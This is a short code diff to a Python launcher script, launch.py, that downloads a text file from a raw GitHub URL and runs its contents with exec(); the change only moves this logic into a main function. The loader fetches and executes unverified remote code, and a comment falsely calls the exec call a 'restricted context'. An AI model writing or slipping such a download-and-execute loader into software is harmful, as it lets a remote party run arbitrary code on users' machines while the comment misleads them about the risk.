@@ -1,3 +1,5 @@
+# launch.py
+
 import urllib.request
 import customtkinter
 import io
@@ -13,9 +15,13 @@ def execute_program(code):
     # Execute the code within a restricted context
     exec(code, globals(), locals())
 
-code_url = 'https://raw.githubusercontent.com/MaxG7855/ee/main/program.txt'
+def main_function():
+    code_url = 'https://raw.githubusercontent.com/MaxG7855/ee/main/program.txt'
 
-response = urllib.request.urlopen(code_url)
-data = response.read().decode('utf-8')  # Assuming the content is text, decode it to a string
+    response = urllib.request.urlopen(code_url)
+    data = response.read().decode('utf-8')  # Assuming the content is text, decode it to a string
 
-execute_program(data)
+    execute_program(data)
+
+if __name__ == "__main__":
+    main_function()
